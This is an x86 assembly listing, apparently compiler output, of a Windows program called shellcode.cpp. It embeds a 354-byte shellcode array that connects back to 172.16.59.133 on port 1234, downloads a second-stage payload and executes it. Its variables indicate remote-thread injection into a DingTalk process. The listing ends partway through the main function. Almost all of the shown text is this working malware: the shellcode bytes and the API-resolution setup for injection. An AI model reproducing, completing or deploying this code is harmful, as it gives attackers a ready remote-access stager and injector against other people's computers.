; Listing generated by Microsoft (R) Optimizing Compiler Version 19.16.27045.0 

	TITLE	C:\Users\Ronpa\Desktop\shellcode\shellcode\shellcode.cpp
	.686P
	.XMM
	include listing.inc
	.model	flat

;INCLUDELIB LIBCMT
;INCLUDELIB OLDNAMES

PUBLIC	?kernel32_str@@3PA_WA				; kernel32_str
PUBLIC	?load_lib_str@@3PADA				; load_lib_str
_TEXT	SEGMENT
AlignRSP PROC
    push esi ; Preserve RSI since we're stomping on it
    mov esi, esp ; Save the value of RSP so it can be restored
    and esp, 0FFFFFFF0h ; Align RSP to 16 bytes
    sub esp, 020h ; Allocate homing space for ExecutePayload
    call _main ; Call the entry point of the payload
    mov esp, esi ; Restore the original value of RSP
    pop esi ; Restore RSI
    ret ; Return to caller
AlignRSP ENDP
?load_lib_str@@3PADA DB 'LoadLibraryA', 00H		; load_lib_str
	ORG $+3
?kernel32_str@@3PA_WA DB 'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H
	DB	'l', 00H, '3', 00H, '2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l'
	DB	00H, 00H, 00H				; kernel32_str
_TEXT	ENDS
PUBLIC	?get_module_by_name@@YAPAXPA_W@Z		; get_module_by_name
PUBLIC	?get_func_by_name@@YAPAXPAXPAD@Z		; get_func_by_name
PUBLIC	_main
; Function compile flags: /Odtp
_TEXT	SEGMENT
_peb$1 = -1496						; size = 472
_Param$2 = -1024					; size = 72
_pbi$ = -952						; size = 24
__GetCurrentProcess$ = -928				; size = 4
__LoadLibraryA$ = -924					; size = 4
_usPathLen$ = -920					; size = 2
_fn_CreateRemoteThread$ = -916				; size = 4
_fn_WriteProcessMemory$ = -912				; size = 4
_fn_VirtualAllocEx$ = -908				; size = 4
_dwPatternLength$ = -904				; size = 4
_status2$3 = -900					; size = 4
_uReturnedLEngth$ = -896				; size = 4
_fNtQueryInformationProcess$ = -892			; size = 4
_status$ = -888						; size = 4
_fNtQuerySystemInformation$ = -884			; size = 4
_usCmdLen$ = -880					; size = 2
_usPathLen$4 = -876					; size = 2
_usCmdLen$5 = -872					; size = 2
_dingtalk_pattern$ = -868				; size = 54
_dingtalk_upper$ = -812					; size = 26
_dingtalk$ = -784					; size = 26
_kernel32_dll_name$ = -756				; size = 26
_load_lib$ = -728					; size = 4
_get_proc$ = -724					; size = 4
__GetModuleHandleA$ = -720				; size = 4
__OpenProcess$ = -716					; size = 4
_AllocMemory$ = -712					; size = 4
__VirtualAlloc$ = -708					; size = 4
_isDingtalk$6 = -704					; size = 4
__VirtualFree$ = -700					; size = 4
_bMatch$7 = -696					; size = 4
_dwID$ = -692						; size = 4
_dwBufferLength$8 = -688				; size = 4
_TargetProcess$ = -684					; size = 4
__ReadProcessMemory$ = -680				; size = 4
_shellcode$ = -676					; size = 354
_nt_query_information_process_name$ = -320		; size = 26
_nt_query_system_information_name$ = -292		; size = 25
_CreateRemoteThread_name$ = -264			; size = 19
_WriteProcessMemory_name$ = -244			; size = 19
_get_current_process_name$ = -224			; size = 18
_read_process_memory_name$ = -204			; size = 18
_get_module_handlea_name$ = -184			; size = 17
_get_proc_name$ = -164					; size = 15
_VirtualAllocEx_name$ = -148				; size = 15
_load_lib_name$ = -132					; size = 13
_virtual_alloc_name$ = -116				; size = 13
_open_process_name$ = -100				; size = 12
_virtual_free_name$ = -88				; size = 12
_ntdll_name$ = -76					; size = 10
_dwNetWorkInstPID$ = -64				; size = 4
_pInfo$ = -60						; size = 4
_pIndexOfCmdLine$9 = -56				; size = 4
_nParamIndex$10 = -52					; size = 4
_nPebIndex$11 = -48					; size = 4
_pImageName$ = -44					; size = 4
_nByteIndex$12 = -40					; size = 4
_pCmdLine$13 = -36					; size = 4
_nCount$14 = -32					; size = 4
_hProcess$ = -28					; size = 4
_nImageNameLength$ = -24				; size = 4
_nIndex$15 = -20					; size = 4
_dwRead$16 = -16					; size = 4
_pSystemInformation$ = -12				; size = 4
__GetProcAddress$ = -8					; size = 4
_base$ = -4						; size = 4
_main	PROC
; File c:\users\ronpa\desktop\shellcode\shellcode\shellcode.cpp
; Line 51
	push	ebp
	mov	ebp, esp
	sub	esp, 1496				; 000005d8H
; Line 55
	mov	BYTE PTR _shellcode$[ebp], 252		; 000000fcH
	mov	BYTE PTR _shellcode$[ebp+1], 232	; 000000e8H
	mov	BYTE PTR _shellcode$[ebp+2], 143	; 0000008fH
	mov	BYTE PTR _shellcode$[ebp+3], 0
	mov	BYTE PTR _shellcode$[ebp+4], 0
	mov	BYTE PTR _shellcode$[ebp+5], 0
	mov	BYTE PTR _shellcode$[ebp+6], 96		; 00000060H
	mov	BYTE PTR _shellcode$[ebp+7], 137	; 00000089H
	mov	BYTE PTR _shellcode$[ebp+8], 229	; 000000e5H
	mov	BYTE PTR _shellcode$[ebp+9], 49		; 00000031H
	mov	BYTE PTR _shellcode$[ebp+10], 210	; 000000d2H
	mov	BYTE PTR _shellcode$[ebp+11], 100	; 00000064H
	mov	BYTE PTR _shellcode$[ebp+12], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+13], 82	; 00000052H
	mov	BYTE PTR _shellcode$[ebp+14], 48	; 00000030H
; Line 56
	mov	BYTE PTR _shellcode$[ebp+15], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+16], 82	; 00000052H
	mov	BYTE PTR _shellcode$[ebp+17], 12	; 0000000cH
	mov	BYTE PTR _shellcode$[ebp+18], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+19], 82	; 00000052H
	mov	BYTE PTR _shellcode$[ebp+20], 20	; 00000014H
	mov	BYTE PTR _shellcode$[ebp+21], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+22], 114	; 00000072H
	mov	BYTE PTR _shellcode$[ebp+23], 40	; 00000028H
	mov	BYTE PTR _shellcode$[ebp+24], 15	; 0000000fH
	mov	BYTE PTR _shellcode$[ebp+25], 183	; 000000b7H
	mov	BYTE PTR _shellcode$[ebp+26], 74	; 0000004aH
	mov	BYTE PTR _shellcode$[ebp+27], 38	; 00000026H
	mov	BYTE PTR _shellcode$[ebp+28], 49	; 00000031H
	mov	BYTE PTR _shellcode$[ebp+29], 255	; 000000ffH
; Line 57
	mov	BYTE PTR _shellcode$[ebp+30], 49	; 00000031H
	mov	BYTE PTR _shellcode$[ebp+31], 192	; 000000c0H
	mov	BYTE PTR _shellcode$[ebp+32], 172	; 000000acH
	mov	BYTE PTR _shellcode$[ebp+33], 60	; 0000003cH
	mov	BYTE PTR _shellcode$[ebp+34], 97	; 00000061H
	mov	BYTE PTR _shellcode$[ebp+35], 124	; 0000007cH
	mov	BYTE PTR _shellcode$[ebp+36], 2
	mov	BYTE PTR _shellcode$[ebp+37], 44	; 0000002cH
	mov	BYTE PTR _shellcode$[ebp+38], 32	; 00000020H
	mov	BYTE PTR _shellcode$[ebp+39], 193	; 000000c1H
	mov	BYTE PTR _shellcode$[ebp+40], 207	; 000000cfH
	mov	BYTE PTR _shellcode$[ebp+41], 13	; 0000000dH
	mov	BYTE PTR _shellcode$[ebp+42], 1
	mov	BYTE PTR _shellcode$[ebp+43], 199	; 000000c7H
	mov	BYTE PTR _shellcode$[ebp+44], 73	; 00000049H
; Line 58
	mov	BYTE PTR _shellcode$[ebp+45], 117	; 00000075H
	mov	BYTE PTR _shellcode$[ebp+46], 239	; 000000efH
	mov	BYTE PTR _shellcode$[ebp+47], 82	; 00000052H
	mov	BYTE PTR _shellcode$[ebp+48], 87	; 00000057H
	mov	BYTE PTR _shellcode$[ebp+49], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+50], 82	; 00000052H
	mov	BYTE PTR _shellcode$[ebp+51], 16	; 00000010H
	mov	BYTE PTR _shellcode$[ebp+52], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+53], 66	; 00000042H
	mov	BYTE PTR _shellcode$[ebp+54], 60	; 0000003cH
	mov	BYTE PTR _shellcode$[ebp+55], 1
	mov	BYTE PTR _shellcode$[ebp+56], 208	; 000000d0H
	mov	BYTE PTR _shellcode$[ebp+57], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+58], 64	; 00000040H
	mov	BYTE PTR _shellcode$[ebp+59], 120	; 00000078H
; Line 59
	mov	BYTE PTR _shellcode$[ebp+60], 133	; 00000085H
	mov	BYTE PTR _shellcode$[ebp+61], 192	; 000000c0H
	mov	BYTE PTR _shellcode$[ebp+62], 116	; 00000074H
	mov	BYTE PTR _shellcode$[ebp+63], 76	; 0000004cH
	mov	BYTE PTR _shellcode$[ebp+64], 1
	mov	BYTE PTR _shellcode$[ebp+65], 208	; 000000d0H
	mov	BYTE PTR _shellcode$[ebp+66], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+67], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+68], 88	; 00000058H
	mov	BYTE PTR _shellcode$[ebp+69], 32	; 00000020H
	mov	BYTE PTR _shellcode$[ebp+70], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+71], 72	; 00000048H
	mov	BYTE PTR _shellcode$[ebp+72], 24	; 00000018H
	mov	BYTE PTR _shellcode$[ebp+73], 1
	mov	BYTE PTR _shellcode$[ebp+74], 211	; 000000d3H
; Line 60
	mov	BYTE PTR _shellcode$[ebp+75], 133	; 00000085H
	mov	BYTE PTR _shellcode$[ebp+76], 201	; 000000c9H
	mov	BYTE PTR _shellcode$[ebp+77], 116	; 00000074H
	mov	BYTE PTR _shellcode$[ebp+78], 60	; 0000003cH
	mov	BYTE PTR _shellcode$[ebp+79], 49	; 00000031H
	mov	BYTE PTR _shellcode$[ebp+80], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+81], 73	; 00000049H
	mov	BYTE PTR _shellcode$[ebp+82], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+83], 52	; 00000034H
	mov	BYTE PTR _shellcode$[ebp+84], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+85], 1
	mov	BYTE PTR _shellcode$[ebp+86], 214	; 000000d6H
	mov	BYTE PTR _shellcode$[ebp+87], 49	; 00000031H
	mov	BYTE PTR _shellcode$[ebp+88], 192	; 000000c0H
	mov	BYTE PTR _shellcode$[ebp+89], 193	; 000000c1H
; Line 61
	mov	BYTE PTR _shellcode$[ebp+90], 207	; 000000cfH
	mov	BYTE PTR _shellcode$[ebp+91], 13	; 0000000dH
	mov	BYTE PTR _shellcode$[ebp+92], 172	; 000000acH
	mov	BYTE PTR _shellcode$[ebp+93], 1
	mov	BYTE PTR _shellcode$[ebp+94], 199	; 000000c7H
	mov	BYTE PTR _shellcode$[ebp+95], 56	; 00000038H
	mov	BYTE PTR _shellcode$[ebp+96], 224	; 000000e0H
	mov	BYTE PTR _shellcode$[ebp+97], 117	; 00000075H
	mov	BYTE PTR _shellcode$[ebp+98], 244	; 000000f4H
	mov	BYTE PTR _shellcode$[ebp+99], 3
	mov	BYTE PTR _shellcode$[ebp+100], 125	; 0000007dH
	mov	BYTE PTR _shellcode$[ebp+101], 248	; 000000f8H
	mov	BYTE PTR _shellcode$[ebp+102], 59	; 0000003bH
	mov	BYTE PTR _shellcode$[ebp+103], 125	; 0000007dH
	mov	BYTE PTR _shellcode$[ebp+104], 36	; 00000024H
; Line 62
	mov	BYTE PTR _shellcode$[ebp+105], 117	; 00000075H
	mov	BYTE PTR _shellcode$[ebp+106], 224	; 000000e0H
	mov	BYTE PTR _shellcode$[ebp+107], 88	; 00000058H
	mov	BYTE PTR _shellcode$[ebp+108], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+109], 88	; 00000058H
	mov	BYTE PTR _shellcode$[ebp+110], 36	; 00000024H
	mov	BYTE PTR _shellcode$[ebp+111], 1
	mov	BYTE PTR _shellcode$[ebp+112], 211	; 000000d3H
	mov	BYTE PTR _shellcode$[ebp+113], 102	; 00000066H
	mov	BYTE PTR _shellcode$[ebp+114], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+115], 12	; 0000000cH
	mov	BYTE PTR _shellcode$[ebp+116], 75	; 0000004bH
	mov	BYTE PTR _shellcode$[ebp+117], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+118], 88	; 00000058H
	mov	BYTE PTR _shellcode$[ebp+119], 28	; 0000001cH
; Line 63
	mov	BYTE PTR _shellcode$[ebp+120], 1
	mov	BYTE PTR _shellcode$[ebp+121], 211	; 000000d3H
	mov	BYTE PTR _shellcode$[ebp+122], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+123], 4
	mov	BYTE PTR _shellcode$[ebp+124], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+125], 1
	mov	BYTE PTR _shellcode$[ebp+126], 208	; 000000d0H
	mov	BYTE PTR _shellcode$[ebp+127], 137	; 00000089H
	mov	BYTE PTR _shellcode$[ebp+128], 68	; 00000044H
	mov	BYTE PTR _shellcode$[ebp+129], 36	; 00000024H
	mov	BYTE PTR _shellcode$[ebp+130], 36	; 00000024H
	mov	BYTE PTR _shellcode$[ebp+131], 91	; 0000005bH
	mov	BYTE PTR _shellcode$[ebp+132], 91	; 0000005bH
	mov	BYTE PTR _shellcode$[ebp+133], 97	; 00000061H
	mov	BYTE PTR _shellcode$[ebp+134], 89	; 00000059H
; Line 64
	mov	BYTE PTR _shellcode$[ebp+135], 90	; 0000005aH
	mov	BYTE PTR _shellcode$[ebp+136], 81	; 00000051H
	mov	BYTE PTR _shellcode$[ebp+137], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+138], 224	; 000000e0H
	mov	BYTE PTR _shellcode$[ebp+139], 88	; 00000058H
	mov	BYTE PTR _shellcode$[ebp+140], 95	; 0000005fH
	mov	BYTE PTR _shellcode$[ebp+141], 90	; 0000005aH
	mov	BYTE PTR _shellcode$[ebp+142], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+143], 18	; 00000012H
	mov	BYTE PTR _shellcode$[ebp+144], 233	; 000000e9H
	mov	BYTE PTR _shellcode$[ebp+145], 128	; 00000080H
	mov	BYTE PTR _shellcode$[ebp+146], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+147], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+148], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+149], 93	; 0000005dH
; Line 65
	mov	BYTE PTR _shellcode$[ebp+150], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+151], 51	; 00000033H
	mov	BYTE PTR _shellcode$[ebp+152], 50	; 00000032H
	mov	BYTE PTR _shellcode$[ebp+153], 0
	mov	BYTE PTR _shellcode$[ebp+154], 0
	mov	BYTE PTR _shellcode$[ebp+155], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+156], 119	; 00000077H
	mov	BYTE PTR _shellcode$[ebp+157], 115	; 00000073H
	mov	BYTE PTR _shellcode$[ebp+158], 50	; 00000032H
	mov	BYTE PTR _shellcode$[ebp+159], 95	; 0000005fH
	mov	BYTE PTR _shellcode$[ebp+160], 84	; 00000054H
	mov	BYTE PTR _shellcode$[ebp+161], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+162], 76	; 0000004cH
	mov	BYTE PTR _shellcode$[ebp+163], 119	; 00000077H
	mov	BYTE PTR _shellcode$[ebp+164], 38	; 00000026H
; Line 66
	mov	BYTE PTR _shellcode$[ebp+165], 7
	mov	BYTE PTR _shellcode$[ebp+166], 137	; 00000089H
	mov	BYTE PTR _shellcode$[ebp+167], 232	; 000000e8H
	mov	BYTE PTR _shellcode$[ebp+168], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+169], 208	; 000000d0H
	mov	BYTE PTR _shellcode$[ebp+170], 184	; 000000b8H
	mov	BYTE PTR _shellcode$[ebp+171], 144	; 00000090H
	mov	BYTE PTR _shellcode$[ebp+172], 1
	mov	BYTE PTR _shellcode$[ebp+173], 0
	mov	BYTE PTR _shellcode$[ebp+174], 0
	mov	BYTE PTR _shellcode$[ebp+175], 41	; 00000029H
	mov	BYTE PTR _shellcode$[ebp+176], 196	; 000000c4H
	mov	BYTE PTR _shellcode$[ebp+177], 84	; 00000054H
	mov	BYTE PTR _shellcode$[ebp+178], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+179], 104	; 00000068H
; Line 67
	mov	BYTE PTR _shellcode$[ebp+180], 41	; 00000029H
	mov	BYTE PTR _shellcode$[ebp+181], 128	; 00000080H
	mov	BYTE PTR _shellcode$[ebp+182], 107	; 0000006bH
	mov	BYTE PTR _shellcode$[ebp+183], 0
	mov	BYTE PTR _shellcode$[ebp+184], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+185], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+186], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+187], 10	; 0000000aH
	mov	BYTE PTR _shellcode$[ebp+188], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+189], 172	; 000000acH
	mov	BYTE PTR _shellcode$[ebp+190], 16	; 00000010H
	mov	BYTE PTR _shellcode$[ebp+191], 59	; 0000003bH
	mov	BYTE PTR _shellcode$[ebp+192], 133	; 00000085H
	mov	BYTE PTR _shellcode$[ebp+193], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+194], 2
; Line 68
	mov	BYTE PTR _shellcode$[ebp+195], 0
	mov	BYTE PTR _shellcode$[ebp+196], 4
	mov	BYTE PTR _shellcode$[ebp+197], 210	; 000000d2H
	mov	BYTE PTR _shellcode$[ebp+198], 137	; 00000089H
	mov	BYTE PTR _shellcode$[ebp+199], 230	; 000000e6H
	mov	BYTE PTR _shellcode$[ebp+200], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+201], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+202], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+203], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+204], 64	; 00000040H
	mov	BYTE PTR _shellcode$[ebp+205], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+206], 64	; 00000040H
	mov	BYTE PTR _shellcode$[ebp+207], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+208], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+209], 234	; 000000eaH
; Line 69
	mov	BYTE PTR _shellcode$[ebp+210], 15	; 0000000fH
	mov	BYTE PTR _shellcode$[ebp+211], 223	; 000000dfH
	mov	BYTE PTR _shellcode$[ebp+212], 224	; 000000e0H
	mov	BYTE PTR _shellcode$[ebp+213], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+214], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+215], 151	; 00000097H
	mov	BYTE PTR _shellcode$[ebp+216], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+217], 16	; 00000010H
	mov	BYTE PTR _shellcode$[ebp+218], 86	; 00000056H
	mov	BYTE PTR _shellcode$[ebp+219], 87	; 00000057H
	mov	BYTE PTR _shellcode$[ebp+220], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+221], 153	; 00000099H
	mov	BYTE PTR _shellcode$[ebp+222], 165	; 000000a5H
	mov	BYTE PTR _shellcode$[ebp+223], 116	; 00000074H
	mov	BYTE PTR _shellcode$[ebp+224], 97	; 00000061H
; Line 70
	mov	BYTE PTR _shellcode$[ebp+225], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+226], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+227], 133	; 00000085H
	mov	BYTE PTR _shellcode$[ebp+228], 192	; 000000c0H
	mov	BYTE PTR _shellcode$[ebp+229], 116	; 00000074H
	mov	BYTE PTR _shellcode$[ebp+230], 10	; 0000000aH
	mov	BYTE PTR _shellcode$[ebp+231], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+232], 78	; 0000004eH
	mov	BYTE PTR _shellcode$[ebp+233], 8
	mov	BYTE PTR _shellcode$[ebp+234], 117	; 00000075H
	mov	BYTE PTR _shellcode$[ebp+235], 236	; 000000ecH
	mov	BYTE PTR _shellcode$[ebp+236], 232	; 000000e8H
	mov	BYTE PTR _shellcode$[ebp+237], 103	; 00000067H
	mov	BYTE PTR _shellcode$[ebp+238], 0
	mov	BYTE PTR _shellcode$[ebp+239], 0
; Line 71
	mov	BYTE PTR _shellcode$[ebp+240], 0
	mov	BYTE PTR _shellcode$[ebp+241], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+242], 0
	mov	BYTE PTR _shellcode$[ebp+243], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+244], 4
	mov	BYTE PTR _shellcode$[ebp+245], 86	; 00000056H
	mov	BYTE PTR _shellcode$[ebp+246], 87	; 00000057H
	mov	BYTE PTR _shellcode$[ebp+247], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+248], 2
	mov	BYTE PTR _shellcode$[ebp+249], 217	; 000000d9H
	mov	BYTE PTR _shellcode$[ebp+250], 200	; 000000c8H
	mov	BYTE PTR _shellcode$[ebp+251], 95	; 0000005fH
	mov	BYTE PTR _shellcode$[ebp+252], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+253], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+254], 131	; 00000083H
; Line 72
	mov	BYTE PTR _shellcode$[ebp+255], 248	; 000000f8H
	mov	BYTE PTR _shellcode$[ebp+256], 0
	mov	BYTE PTR _shellcode$[ebp+257], 126	; 0000007eH
	mov	BYTE PTR _shellcode$[ebp+258], 54	; 00000036H
	mov	BYTE PTR _shellcode$[ebp+259], 139	; 0000008bH
	mov	BYTE PTR _shellcode$[ebp+260], 54	; 00000036H
	mov	BYTE PTR _shellcode$[ebp+261], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+262], 64	; 00000040H
	mov	BYTE PTR _shellcode$[ebp+263], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+264], 0
	mov	BYTE PTR _shellcode$[ebp+265], 16	; 00000010H
	mov	BYTE PTR _shellcode$[ebp+266], 0
	mov	BYTE PTR _shellcode$[ebp+267], 0
	mov	BYTE PTR _shellcode$[ebp+268], 86	; 00000056H
	mov	BYTE PTR _shellcode$[ebp+269], 106	; 0000006aH
; Line 73
	mov	BYTE PTR _shellcode$[ebp+270], 0
	mov	BYTE PTR _shellcode$[ebp+271], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+272], 88	; 00000058H
	mov	BYTE PTR _shellcode$[ebp+273], 164	; 000000a4H
	mov	BYTE PTR _shellcode$[ebp+274], 83	; 00000053H
	mov	BYTE PTR _shellcode$[ebp+275], 229	; 000000e5H
	mov	BYTE PTR _shellcode$[ebp+276], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+277], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+278], 147	; 00000093H
	mov	BYTE PTR _shellcode$[ebp+279], 83	; 00000053H
	mov	BYTE PTR _shellcode$[ebp+280], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+281], 0
	mov	BYTE PTR _shellcode$[ebp+282], 86	; 00000056H
	mov	BYTE PTR _shellcode$[ebp+283], 83	; 00000053H
	mov	BYTE PTR _shellcode$[ebp+284], 87	; 00000057H
; Line 74
	mov	BYTE PTR _shellcode$[ebp+285], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+286], 2
	mov	BYTE PTR _shellcode$[ebp+287], 217	; 000000d9H
	mov	BYTE PTR _shellcode$[ebp+288], 200	; 000000c8H
	mov	BYTE PTR _shellcode$[ebp+289], 95	; 0000005fH
	mov	BYTE PTR _shellcode$[ebp+290], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+291], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+292], 131	; 00000083H
	mov	BYTE PTR _shellcode$[ebp+293], 248	; 000000f8H
	mov	BYTE PTR _shellcode$[ebp+294], 0
	mov	BYTE PTR _shellcode$[ebp+295], 125	; 0000007dH
	mov	BYTE PTR _shellcode$[ebp+296], 40	; 00000028H
	mov	BYTE PTR _shellcode$[ebp+297], 88	; 00000058H
	mov	BYTE PTR _shellcode$[ebp+298], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+299], 0
; Line 75
	mov	BYTE PTR _shellcode$[ebp+300], 64	; 00000040H
	mov	BYTE PTR _shellcode$[ebp+301], 0
	mov	BYTE PTR _shellcode$[ebp+302], 0
	mov	BYTE PTR _shellcode$[ebp+303], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+304], 0
	mov	BYTE PTR _shellcode$[ebp+305], 80	; 00000050H
	mov	BYTE PTR _shellcode$[ebp+306], 104	; 00000068H
	mov	BYTE PTR _shellcode$[ebp+307], 11	; 0000000bH
	mov	BYTE PTR _shellcode$[ebp+308], 47	; 0000002fH
	mov	BYTE PTR _shellcode$[ebp+309], 15	; 0000000fH
	mov	BYTE PTR _shellcode$[ebp+310], 48	; 00000030H
	mov	BYTE PTR _shellcode$[ebp+311], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+312], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+313], 87	; 00000057H
	mov	BYTE PTR _shellcode$[ebp+314], 104	; 00000068H
; Line 76
	mov	BYTE PTR _shellcode$[ebp+315], 117	; 00000075H
	mov	BYTE PTR _shellcode$[ebp+316], 110	; 0000006eH
	mov	BYTE PTR _shellcode$[ebp+317], 77	; 0000004dH
	mov	BYTE PTR _shellcode$[ebp+318], 97	; 00000061H
	mov	BYTE PTR _shellcode$[ebp+319], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+320], 213	; 000000d5H
	mov	BYTE PTR _shellcode$[ebp+321], 94	; 0000005eH
	mov	BYTE PTR _shellcode$[ebp+322], 94	; 0000005eH
	mov	BYTE PTR _shellcode$[ebp+323], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+324], 12	; 0000000cH
	mov	BYTE PTR _shellcode$[ebp+325], 36	; 00000024H
	mov	BYTE PTR _shellcode$[ebp+326], 15	; 0000000fH
	mov	BYTE PTR _shellcode$[ebp+327], 133	; 00000085H
	mov	BYTE PTR _shellcode$[ebp+328], 112	; 00000070H
	mov	BYTE PTR _shellcode$[ebp+329], 255	; 000000ffH
; Line 77
	mov	BYTE PTR _shellcode$[ebp+330], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+331], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+332], 233	; 000000e9H
	mov	BYTE PTR _shellcode$[ebp+333], 155	; 0000009bH
	mov	BYTE PTR _shellcode$[ebp+334], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+335], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+336], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+337], 1
	mov	BYTE PTR _shellcode$[ebp+338], 195	; 000000c3H
	mov	BYTE PTR _shellcode$[ebp+339], 41	; 00000029H
	mov	BYTE PTR _shellcode$[ebp+340], 198	; 000000c6H
	mov	BYTE PTR _shellcode$[ebp+341], 117	; 00000075H
	mov	BYTE PTR _shellcode$[ebp+342], 193	; 000000c1H
	mov	BYTE PTR _shellcode$[ebp+343], 195	; 000000c3H
	mov	BYTE PTR _shellcode$[ebp+344], 187	; 000000bbH
; Line 78
	mov	BYTE PTR _shellcode$[ebp+345], 240	; 000000f0H
	mov	BYTE PTR _shellcode$[ebp+346], 181	; 000000b5H
	mov	BYTE PTR _shellcode$[ebp+347], 162	; 000000a2H
	mov	BYTE PTR _shellcode$[ebp+348], 86	; 00000056H
	mov	BYTE PTR _shellcode$[ebp+349], 106	; 0000006aH
	mov	BYTE PTR _shellcode$[ebp+350], 0
	mov	BYTE PTR _shellcode$[ebp+351], 83	; 00000053H
	mov	BYTE PTR _shellcode$[ebp+352], 255	; 000000ffH
	mov	BYTE PTR _shellcode$[ebp+353], 213	; 000000d5H
; Line 79
	mov	eax, 107				; 0000006bH
	mov	WORD PTR _kernel32_dll_name$[ebp], ax
	mov	ecx, 101				; 00000065H
	mov	WORD PTR _kernel32_dll_name$[ebp+2], cx
	mov	edx, 114				; 00000072H
	mov	WORD PTR _kernel32_dll_name$[ebp+4], dx
	mov	eax, 110				; 0000006eH
	mov	WORD PTR _kernel32_dll_name$[ebp+6], ax
	mov	ecx, 101				; 00000065H
	mov	WORD PTR _kernel32_dll_name$[ebp+8], cx
	mov	edx, 108				; 0000006cH
	mov	WORD PTR _kernel32_dll_name$[ebp+10], dx
	mov	eax, 51					; 00000033H
	mov	WORD PTR _kernel32_dll_name$[ebp+12], ax
	mov	ecx, 50					; 00000032H
	mov	WORD PTR _kernel32_dll_name$[ebp+14], cx
	mov	edx, 46					; 0000002eH
	mov	WORD PTR _kernel32_dll_name$[ebp+16], dx
	mov	eax, 100				; 00000064H
	mov	WORD PTR _kernel32_dll_name$[ebp+18], ax
	mov	ecx, 108				; 0000006cH
	mov	WORD PTR _kernel32_dll_name$[ebp+20], cx
	mov	edx, 108				; 0000006cH
	mov	WORD PTR _kernel32_dll_name$[ebp+22], dx
	xor	eax, eax
	mov	WORD PTR _kernel32_dll_name$[ebp+24], ax
; Line 80
	mov	BYTE PTR _ntdll_name$[ebp], 110		; 0000006eH
	mov	BYTE PTR _ntdll_name$[ebp+1], 116	; 00000074H
	mov	BYTE PTR _ntdll_name$[ebp+2], 100	; 00000064H
	mov	BYTE PTR _ntdll_name$[ebp+3], 108	; 0000006cH
	mov	BYTE PTR _ntdll_name$[ebp+4], 108	; 0000006cH
	mov	BYTE PTR _ntdll_name$[ebp+5], 46	; 0000002eH
